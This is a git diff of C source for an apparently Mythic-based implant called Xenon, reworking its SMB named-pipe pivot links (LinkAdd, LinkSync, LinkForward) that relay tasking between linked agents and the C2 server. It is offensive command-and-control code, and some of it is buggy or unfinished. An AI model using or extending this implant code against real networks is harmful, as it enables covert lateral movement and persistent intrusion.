@@ -32,13 +32,14 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
     _dbg("Adding Link Agent for Pipename: %s", PipeName);
 
     /* Output */
-    PVOID outBuf  = NULL;
+    PVOID  outBuf = NULL;
     SIZE_T outLen = 0;
+    UINT32 LinkId = 0;
 
 
     /* Connect to Pivot Agent */
     DWORD Result = 0;
-    if ( !LinkAdd(PipeName, &outBuf, &outLen) ) 
+    if ( !LinkAdd(taskUuid, PipeName, &outBuf, &outLen, &LinkId) ) 
     {
         _err("Failed to link smb agent.");
         Result = GetLastError();
@@ -46,58 +47,68 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
         goto END;
     }
 
-    /* P2P Linking uses a Custom Package ID - LINK_ADD */
-    PPackage locals = PackageInit(LINK_ADD, TRUE);      
-    PackageAddString(locals, taskUuid, FALSE);              // PCHAR:               Task ID
-    PackageAddInt32(locals, Result);                        // INT32:               Status   
-    PackageAddString(locals, outBuf, TRUE);                 // DWORD + PCHAR:       Link ID + B64 Message
+    /* Send P2P Checkin Message */
+    PPackage locals = PackageInit(NULL, FALSE);
+    PackageAddByte(locals, LINK_ADD);                           // BYTE:                LINK_CHECKIN           
+    PackageAddBytes(locals, taskUuid, TASK_UUID_SIZE, FALSE);   // PCHAR:               Task ID
+    PackageAddInt32(locals, Result);                            // UINT32:              Status   
+    PackageAddInt32(locals, LinkId);                            // UINT32:              Link ID
+    PackageAddString(locals, outBuf + 4, TRUE);                 // PCHAR:               B64 Message (dont include LinkID bytes)
+
+    PackageQueue(locals);
+
+    /* Track Task ID Link */
+
+    goto END;
+
+
 
     /* Send P2P Checkin Message to Mythic */
-    PARSER Response = { 0 };
-    PackageSend(locals, &Response);
+    // PARSER Response = { 0 };
+    // PackageSend(locals, &Response);
 
 
-    /* Handle the delegate message back */
-    PCHAR  P2pUuid          = NULL;
-    PCHAR  P2pMsg           = NULL;
-    SIZE_T P2pIdLen         = 0;
-    SIZE_T P2pMsgLen        = 0;
-    UINT32 NumOfDelegates   = 0;
+    // /* Handle the delegate message back */
+    // PCHAR  P2pUuid          = NULL;
+    // PCHAR  P2pMsg           = NULL;
+    // SIZE_T P2pIdLen         = 0;
+    // SIZE_T P2pMsgLen        = 0;
+    // UINT32 NumOfDelegates   = 0;
 
-    /* Response should contain a delegate msg for P2P checkin */
-    BOOL isDelegates = (BOOL)ParserGetByte(&Response);
-    _dbg("isDelegates : %s", isDelegates ? "TRUE" : "FALSE");
-    if ( isDelegates )
-    {
-        NumOfDelegates  = ParserGetInt32(&Response);
-        P2pUuid         = ParserStringCopy(&Response, &P2pIdLen);
-        P2pMsg          = ParserStringCopy(&Response, &P2pMsgLen);
+    // /* Response should contain a delegate msg for P2P checkin */
+    // BOOL isDelegates = (BOOL)ParserGetByte(&Response);
+    // _dbg("isDelegates : %s", isDelegates ? "TRUE" : "FALSE");
+    // if ( isDelegates )
+    // {
+    //     NumOfDelegates  = ParserGetInt32(&Response);
+    //     P2pUuid         = ParserStringCopy(&Response, &P2pIdLen);
+    //     P2pMsg          = ParserStringCopy(&Response, &P2pMsgLen);
 
-        _dbg("Package should contain : %d msgs.", NumOfDelegates);
-        _dbg("P2P New UUID           : %s", P2pUuid);
-        _dbg("P2P Raw Msg %d bytes   : %s", P2pMsgLen, P2pMsg);
+    //     _dbg("Package should contain : %d msgs.", NumOfDelegates);
+    //     _dbg("P2P New UUID           : %s", P2pUuid);
+    //     _dbg("P2P Raw Msg %d bytes   : %s", P2pMsgLen, P2pMsg);
 
-        /* Update Mythic ID for Link */
-        xenonConfig->SmbLinks->AgentId = P2pUuid;
+    //     /* Update Mythic ID for Link */
+    //     xenonConfig->SmbLinks->AgentId = P2pUuid;
         
-        /* Forward Checkin Response to intended Linked Agent */
-        LinkForward( P2pMsg, P2pMsgLen );
-    }
-    else
-    {
-        _err("No delegates because byte was : 0x%hx", isDelegates);
-        goto END;
-    }
+    //     /* Forward Checkin Response to intended Linked Agent */
+    //     LinkForward( P2pMsg, P2pMsgLen );
+    // }
+    // else
+    // {
+    //     _err("No delegates because byte was : 0x%hx", isDelegates);
+    //     goto END;
+    // }
 
 
     /* This agent may now receive delegate messages for Link */
 
 END:
 
-    PackageDestroy(locals);
+    // PackageDestroy(locals);
     LocalFree(outBuf);
-    if (P2pMsg) LocalFree(P2pMsg);
-    if (&Response) ParserDestroy(&Response);
+    // if (P2pMsg) LocalFree(P2pMsg);
+    // if (&Response) ParserDestroy(&Response);
 
     return;
 }
@@ -120,15 +131,13 @@ VOID UnLink(PCHAR taskUuid, PPARSER arguments)
  *  Helper Functions
  */
 
-
-
  /**
  * @brief Add a new SMB pivot link to Agent.
  * 
- * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Pivot.c  
+ * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Pivot.c
  * @return BOOL  
  */
-BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
+BOOL LinkAdd( PCHAR TaskUuid, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen, UINT32* LinkId)
 {
     PLINKS LinkData    = NULL;
     HANDLE hPipe       = NULL;
@@ -200,10 +209,16 @@ BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
         LinkData->hPipe           = hPipe;
         LinkData->Next            = NULL;
         LinkData->LinkId          = PivotParseLinkId(*outBuf, *outLen);
+        
+
+        strncpy(LinkData->TaskUuid, TaskUuid, strlen(TaskUuid));
         _dbg("Parsed SMB Link ID => [%x] \n", LinkData->LinkId);
         LinkData->PipeName        = LocalAlloc(LPTR, strlen(PipeName));        // TODO - Check this feels like an issue
         memcpy( LinkData->PipeName, PipeName, strlen(PipeName) );
 
+        *LinkId = LinkData->LinkId;
+
+        /* Link */
         if ( !xenonConfig->SmbLinks )
         {
             xenonConfig->SmbLinks = LinkData;
@@ -234,60 +249,163 @@ BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
     return TRUE;
 }
 
+/**
+ * @brief Synchronize delegate messages to appropriate P2P Link
+ */
+BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
+{
+    SIZE_T IdLen        = 0;
+    SIZE_T MsgLen       = 0;
+    UINT32 LinkId       = 0;
+    UINT32 NumOfParams  = 0;
+    PCHAR  P2pUuid      = NULL;
+    PCHAR  P2pMsg       = NULL;
+    BOOL   IsCheckin    = FALSE;
+    BOOL   Success      = FALSE;
+
+    if (!Response)
+        return FALSE;
+
+    NumOfParams = ParserGetInt32(Response);
+    if (NumOfParams == 0)
+        return;
+
+    _dbg("[LINK SYNC] Buffer:");
+    print_bytes(Response->Buffer, Response->Length);
+
+    IsCheckin   = (BOOL)ParserGetByte(Response);
+    LinkId      = ParserGetInt32(Response);
+    P2pUuid     = ParserStringCopy(Response, &IdLen);
+    P2pMsg      = ParserStringCopy(Response, &MsgLen);
+
+    _dbg("[LINK SYNC] Received P2P Response with args: \n\tIsCheckin: %s \n\tLinkId: %x \n\tP2P UUID: %s \n\tP2PMsg: %s", IsCheckin ? "TRUE" : "FALSE", LinkId, P2pUuid, P2pMsg);
+
+    /* Find Correct Link and Sync Data */
+    PLINKS Current = xenonConfig->SmbLinks;
+    PLINKS Prev    = NULL;
+
+    while ( Current )
+    {
+        PLINKS Next = Current->Next;
+
+        /* Update Mythic Agent ID If Checkin */
+        if ( IsCheckin )
+        {
+            if ( Current->LinkId == LinkId )
+            {
+                Current->AgentId = P2pUuid;
+
+                _dbg("[LINK SYNC] Updated Link Agent ID => [%s]", Current->AgentId);
+            }
+            else
+            {
+                _err("Failed to find the matching Link by LinkID");
+                goto CLEANUP;
+            }
+        }
+        
+        
+        /* Search by AgentId and Send Data */
+        if ( strcmp(Current->AgentId, P2pUuid) == 0 )
+        {
+            _dbg("[LINK SYNC] Syncing %d bytes to Link ID [%x]", MsgLen, Current->AgentId);
+
+            if ( !PackageSendPipe(Current->hPipe, P2pMsg, MsgLen) ) {
+                DWORD error = GetLastError();
+                _err("Failed to write data to pipe. ERROR : %d", error);
+                goto CLEANUP;
+            }
+
+            Success = TRUE;
+            goto CLEANUP;
+        }
+
+        Prev    = Current;
+        Current = Next;
+    }
+
+CLEANUP:
+
+    LocalFree(P2pMsg);
+    if ( !IsCheckin ) LocalFree(P2pUuid);
+
+    return Success;
+}
+
 
 /**
  * @brief Send message to P2P Pipe
  * 
  * @return BOOL
  */
-BOOL LinkForward( PVOID Msg, SIZE_T Length )
+BOOL LinkForward( PCHAR TaskUuid, PPARSER Response )
 {
-    /** New Packet Format
-     * 
-     * ( isDelegates? + NumOfDelegates + ( ID + SizeOfMessage + BASE64_MESSAGE ) )
-     */
-    // BOOL   Success          = FALSE;
-    // UINT32 NumOfDelegates   = ParserGetInt32(delegates);
-    
-    // /* Process all delegate messages */
-    // for ( INT i = 0; i < NumOfDelegates; i++ )
-    // {
-    //     SIZE_T  szId     = 0;
-    //     SIZE_T  szMsg    = 0;
-    //     UINT32  LinkId   = ParserGetInt32(delegates);
-    //     PLINKS  TempLink = xenonConfig->SmbLinks;
-        
-    //     _dbg("Received Delegate Message for Link ID [%x]", LinkId);
-    //     // TODO - create a loop for checking all Links in list
-        
-    //     if ( LinkId == TempLink->LinkId )
-    //     {
-    //         SIZE_T sizeOfMsg = ParserGetInt32(delegates);
+    PCHAR  P2pUuid      = NULL;
+    PCHAR  P2pMsg       = NULL;
+    SIZE_T IdLen        = TASK_UUID_SIZE;
+    SIZE_T MsgLen       = 0;
+    UINT32 LinkId       = 0;
+    BOOL   IsCheckin    = FALSE;
+    BOOL   Success      = FALSE;
 
-    //         _dbg("Received Delegate Message for Link ID [%x]", LinkId);
-    //         _dbg("Delegate message Link ID [%x] with %d bytes", LinkId, sizeOfMsg);
+    IsCheckin   = (BOOL)ParserGetByte(Response);
+    _dbg("[LINK SYNC] IsCheckin: [%s]", IsCheckin ? "TRUE" : "FALSE");
+    LinkId      = ParserGetInt32(Response);
+    _dbg("[LINK SYNC] LinkId: [%x]", LinkId);
+    P2pUuid     = ParserGetString(Response, &IdLen);
+    P2pMsg      = ParserGetString(Response, &MsgLen);
 
-    //         if ( !PackageSendPipe(TempLink->hPipe, delegates->Buffer, sizeOfMsg) ) {
-    //             DWORD error = GetLastError();
-	// 	        _err("Failed to write data to pipe. ERROR : %d", error);
-    //             goto END;
-    //         }
-    //     }
-    // }
-    BOOL    Success          = FALSE;
-    PLINKS  TempLink         = xenonConfig->SmbLinks;
+    _dbg("[LINK FORWARD] Received P2P Msg for Link Agent ID [%s] with %d bytes ", P2pUuid, MsgLen);
 
-    _dbg("Sending message to pipe [%x]", TempLink->LinkId);
+    /* Traverse entire list looking for Agent UUID */
+    PLINKS Current = xenonConfig->SmbLinks;
+    PLINKS Prev    = NULL;
 
-    if ( !PackageSendPipe(TempLink->hPipe, Msg, Length) ) {
-        DWORD error = GetLastError();
-        _err("Failed to write data to pipe. ERROR : %d", error);
-        goto END;
+    while ( Current )
+    {
+        PLINKS Next = Current->Next;
+
+        /* Update Mythic Agent ID If Checkin */
+        if ( IsCheckin )
+        {
+            if ( Current->LinkId == LinkId )
+            {
+                Current->AgentId = P2pUuid;
+
+                _dbg("[LINK FORWARD] Updated Link Agent ID => [%s]", Current->AgentId);
+            }
+            else
+            {
+                _err("Failed to find the matching Link by LinkID");
+                goto CLEANUP;
+            }
+        }
+
+        /* Search by AgentId and Send Data */
+        if ( strcmp(Current->AgentId, P2pUuid) == 0 )
+        {
+            _dbg("[LINK FORWARD] Syncing %d bytes to Link ID [%x]", MsgLen, Current->AgentId);
+
+            if ( !PackageSendPipe(Current->hPipe, P2pMsg, MsgLen) ) {
+                DWORD error = GetLastError();
+                _err("Failed to write data to pipe. ERROR : %d", error);
+                goto CLEANUP;
+            }
+
+            Success = TRUE;
+            goto CLEANUP;
+        }
+
+        Prev    = Current;
+        Current = Next;
     }
 
     Success = TRUE;
 
-END:
+CLEANUP:
+
+    LocalFree(P2pMsg);
+    if ( !IsCheckin ) LocalFree(P2pUuid);
 
     return Success;
 }
@@ -336,8 +454,8 @@ VOID LinkPush()
 
                         if ( ReadFile( TempList->hPipe, Output, Length, &BytesSize, NULL ) )
                         {
-                            _dbg("Linked Agent -> (Msg %d bytes) -> C2", BytesSize);
-                            print_bytes(Output, BytesSize);
+                            // _dbg("Linked Agent -> (Msg %d bytes) -> C2", BytesSize);
+                            // print_bytes(Output, BytesSize);
 
                             /* Verify Our Link ID from the package */
                             PARSER Temp = { 0 };
@@ -357,11 +475,14 @@ VOID LinkPush()
                             _dbg("Link ID [%x] has message of %d bytes", TempId, BytesSize);
 
                             /* Send Link msg as a delegate type (LINK_MSG) */
-                            Package = PackageInit( LINK_MSG, TRUE );
-                            PackageAddString( Package, TempList->AgentId, FALSE );
-                            PackageAddBytes( Package, Temp.Buffer, Temp.Length, TRUE );
+                            // Package = PackageInit( LINK_MSG, TRUE );
+                            Package = PackageInit(NULL, FALSE);
+                            PackageAddByte(Package, LINK_MSG);
+                            PackageAddString(Package, TempList->AgentId, FALSE);
+                            PackageAddBytes(Package, Temp.Buffer, Temp.Length, TRUE);
 
-                            PackageSend( Package, NULL );
+                            PackageQueue(Package);
+                            // PackageSend( Package, NULL );
 
                             /* Clean up */
                             ParserDestroy(&Temp);
